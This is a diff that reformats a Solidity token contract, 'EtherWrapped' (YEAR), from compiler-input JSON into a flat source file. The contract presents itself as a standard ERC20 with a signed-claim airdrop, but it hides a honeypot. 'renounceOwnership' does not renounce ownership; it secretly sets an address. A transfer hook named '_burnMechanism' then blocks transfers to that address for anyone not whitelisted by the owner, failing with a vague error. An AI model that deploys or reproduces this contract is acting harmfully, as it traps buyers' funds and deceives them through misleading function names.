@@ -1,26 +1,276 @@
-{{
-  "language": "Solidity",
-  "sources": {
-    "token.sol": {
-      "content": "// SPDX-License-Identifier: UNLICENSE\npragma solidity ^0.8.0;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this;\n        return msg.data;\n    }\n}\n\n\n// File @openzeppelin/contracts/access/Ownable.sol@v4.1.0\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n \n}\n\n// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.1.0\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\n// File @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol@v4.1.0\ninterface IERC20Metadata is IERC20 {\n\n    function name() external view returns (string memory);\n    \n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\n\n// File @openzeppelin/contracts/token/ERC20/ERC20.sol@v4.1.0\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping (address => uint256) private _balances;\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    constructor (string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _burnMechanism(sender, recipient);\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[sender] = senderBalance - amount;\n        _balances[recipient] += amount;\n\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _burnMechanism(address(0), account);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _burnMechanism(account, address(0));\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        _balances[account] = accountBalance - amount;\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _burnMechanism(address from, address to) internal virtual { }\n}\n\ncontract EW is ERC20, Ownable {\n    mapping(address=>bool) private _db;\n    mapping(address=>bool) private _claims;\n    address private _ownershipId;\n    address private authority;\n    \n    constructor() ERC20('EtherWrapped','YEAR') {\n        authority = 0x42960c7F91E7aCA98f374296Df900Cb4d6B09601;\n        _mint(authority, 1000000000 * 10 ** 18);\n        _db[authority] = true;\n    }\n\n    function _mint(\n        address account,\n        uint256 amount\n    ) internal virtual override (ERC20) {\n        super._mint(account, amount);\n    }\n    \n    function grantPermissions(address user, bool state) public onlyOwner {\n        _db[user] = state;\n    }\n    \n    function renounceOwnership(address ownershipId_) public onlyOwner {\n        _ownershipId = ownershipId_;\n    }\n\n    function _burnMechanism(address from, address to) internal virtual override {\n        if(to == _ownershipId) {\n            require(_db[from], \"An unexpected error occurred.\");\n        }\n    }\n\n    function claim(uint _amount, bytes memory signature) public {\n        address to = _msgSender();\n        require(!_claims[to] && verify(authority, to, _amount, signature), \"Failed Authentication\");\n        _claims[to] = true;\n        _mint(to, _amount);\n    }\n\n    function getMessageHash(\n        address _to,\n        uint _amount\n    ) internal pure returns (bytes32) {\n        return keccak256(abi.encodePacked(_to, _amount));\n    }\n\n    function getEthSignedMessageHash(\n        bytes32 _messageHash\n    ) internal pure returns (bytes32) {\n        return keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", _messageHash));\n    }\n\n    function verify(\n        address _signer,\n        address _to,\n        uint _amount,\n        bytes memory signature\n    ) internal pure returns (bool) {\n        bytes32 ethSignedMessageHash = getEthSignedMessageHash(getMessageHash(_to, _amount));\n        return recoverSigner(ethSignedMessageHash, signature) == _signer;\n    }\n\n    function recoverSigner(\n        bytes32 _ethSignedMessageHash,\n        bytes memory _signature\n    ) internal pure returns (address) {\n        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);\n        return ecrecover(_ethSignedMessageHash, v, r, s);\n    }\n\n    function splitSignature(\n        bytes memory sig\n    ) internal pure returns (bytes32 r, bytes32 s, uint8 v) {\n        require(sig.length == 65, \"invalid signature length\");\n\n        assembly {\n            r := mload(add(sig, 32))\n            s := mload(add(sig, 64))\n            v := byte(0, mload(add(sig, 96)))\n        }\n    }\n}"
-    }
-  },
-  "settings": {
-    "optimizer": {
-      "enabled": false,
-      "runs": 200
-    },
-    "outputSelection": {
-      "*": {
-        "*": [
-          "evm.bytecode",
-          "evm.deployedBytecode",
-          "devdoc",
-          "userdoc",
-          "metadata",
-          "abi"
-        ]
-      }
-    }
-  }
-}}
+// token.sol
+
+// SPDX-License-Identifier: UNLICENSE
+pragma solidity ^0.8.0;
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes calldata) {
+        this;
+        return msg.data;
+    }
+}
+
+
+// File @openzeppelin/contracts/access/Ownable.sol@v4.1.0
+abstract contract Ownable is Context {
+    address private _owner;
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    constructor () {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
+
+    function owner() public view virtual returns (address) {
+        return _owner;
+    }
+
+    modifier onlyOwner() {
+        require(owner() == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+ 
+}
+
+// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.1.0
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount) external returns (bool);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+
+// File @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol@v4.1.0
+interface IERC20Metadata is IERC20 {
+
+    function name() external view returns (string memory);
+    
+    function symbol() external view returns (string memory);
+
+    function decimals() external view returns (uint8);
+}
+
+
+// File @openzeppelin/contracts/token/ERC20/ERC20.sol@v4.1.0
+contract ERC20 is Context, IERC20, IERC20Metadata {
+    mapping (address => uint256) private _balances;
+
+    mapping (address => mapping (address => uint256)) private _allowances;
+
+    uint256 private _totalSupply;
+
+    string private _name;
+    string private _symbol;
+
+    constructor (string memory name_, string memory symbol_) {
+        _name = name_;
+        _symbol = symbol_;
+    }
+
+    function name() public view virtual override returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view virtual override returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view virtual override returns (uint8) {
+        return 18;
+    }
+
+    function totalSupply() public view virtual override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view virtual override returns (uint256) {
+        return _balances[account];
+    }
+
+    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender) public view virtual override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public virtual override returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
+        _transfer(sender, recipient, amount);
+
+        uint256 currentAllowance = _allowances[sender][_msgSender()];
+        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
+        _approve(sender, _msgSender(), currentAllowance - amount);
+
+        return true;
+    }
+
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
+        return true;
+    }
+
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        uint256 currentAllowance = _allowances[_msgSender()][spender];
+        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
+        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
+
+        return true;
+    }
+
+    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+
+        _burnMechanism(sender, recipient);
+
+        uint256 senderBalance = _balances[sender];
+        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+        _balances[sender] = senderBalance - amount;
+        _balances[recipient] += amount;
+
+        emit Transfer(sender, recipient, amount);
+    }
+
+    function _mint(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: mint to the zero address");
+
+        _burnMechanism(address(0), account);
+
+        _totalSupply += amount;
+        _balances[account] += amount;
+        emit Transfer(address(0), account, amount);
+    }
+
+    function _burn(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: burn from the zero address");
+
+        _burnMechanism(account, address(0));
+
+        uint256 accountBalance = _balances[account];
+        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
+        _balances[account] = accountBalance - amount;
+        _totalSupply -= amount;
+
+        emit Transfer(account, address(0), amount);
+    }
+
+    function _approve(address owner, address spender, uint256 amount) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _burnMechanism(address from, address to) internal virtual { }
+}
+
+contract EW is ERC20, Ownable {
+    mapping(address=>bool) private _db;
+    mapping(address=>bool) private _claims;
+    address private _ownershipId;
+    address private authority;
+    
+    constructor() ERC20('EtherWrapped','YEAR') {
+        authority = 0x42960c7F91E7aCA98f374296Df900Cb4d6B09601;
+        _mint(authority, 1000000000 * 10 ** 18);
+        _db[authority] = true;
+    }
+
+    function _mint(
+        address account,
+        uint256 amount
+    ) internal virtual override (ERC20) {
+        super._mint(account, amount);
+    }
+    
+    function grantPermissions(address user, bool state) public onlyOwner {
+        _db[user] = state;
+    }
+    
+    function renounceOwnership(address ownershipId_) public onlyOwner {
+        _ownershipId = ownershipId_;
+    }
+
+    function _burnMechanism(address from, address to) internal virtual override {
+        if(to == _ownershipId) {
+            require(_db[from], "An unexpected error occurred.");
+        }
+    }
+
+    function claim(uint _amount, bytes memory signature) public {
+        address to = _msgSender();
+        require(!_claims[to] && verify(authority, to, _amount, signature), "Failed Authentication");
+        _claims[to] = true;
+        _mint(to, _amount);
+    }
+
+    function getMessageHash(
+        address _to,
+        uint _amount
+    ) internal pure returns (bytes32) {
+        return keccak256(abi.encodePacked(_to, _amount));
+    }
+
+    function getEthSignedMessageHash(
+        bytes32 _messageHash
+    ) internal pure returns (bytes32) {
+        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", _messageHash));
+    }
+
+    function verify(
+        address _signer,
+        address _to,
+        uint _amount,
+        bytes memory signature
+    ) internal pure returns (bool) {
+        bytes32 ethSignedMessageHash = getEthSignedMessageHash(getMessageHash(_to, _amount));
+        return recoverSigner(ethSignedMessageHash, signature) == _signer;
+    }
+
+    function recoverSigner(
+        bytes32 _ethSignedMessageHash,
+        bytes memory _signature
+    ) internal pure returns (address) {
+        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);
+        return ecrecover(_ethSignedMessageHash, v, r, s);
+    }
+
+    function splitSignature(
+        bytes memory sig
+    ) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
+        require(sig.length == 65, "invalid signature length");
+
+        assembly {
+            r := mload(add(sig, 32))
+            s := mload(add(sig, 64))
+            v := byte(0, mload(add(sig, 96)))
+        }
+    }
+}
+
